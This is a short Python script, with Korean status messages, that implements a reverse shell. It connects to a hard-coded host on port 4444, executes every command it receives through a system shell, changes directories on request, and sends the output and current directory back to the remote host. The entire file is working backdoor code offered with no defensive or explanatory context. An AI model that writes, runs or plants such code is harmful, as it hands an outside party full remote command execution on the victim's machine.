import os
import socket
import subprocess

HOST = "192.168.219.117"
BUF = 4096


def main():
    try:
        host = HOST
        port = 4444
        s = socket.socket()
    except socket.error as msg:
        print("소켓 생성 에러: " + str(msg))
        return 0
    
    try:
        s.connect((host, port))
    except socket.error as msg:
        print("소켓 연결 에러: " + str(msg))
        return 0

    while True:
        data = s.recv(4096)

        if data[:].decode("utf-8") == "quit":
            s.close()
            break

        if data[:2].decode("utf-8") == "cd":
            try:
                os.chdir(data[3:].decode("utf-8"))
            except:
                pass

        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "cp949")
                s.send(str.encode(output_str + str(os.getcwd()) + ">"))
            except:
                output_str = "명령이 실행되지 않았습니다.\n"
                s.send(str.encode(output_str + str(os.getcwd) + ">"))

    s.close()


main()
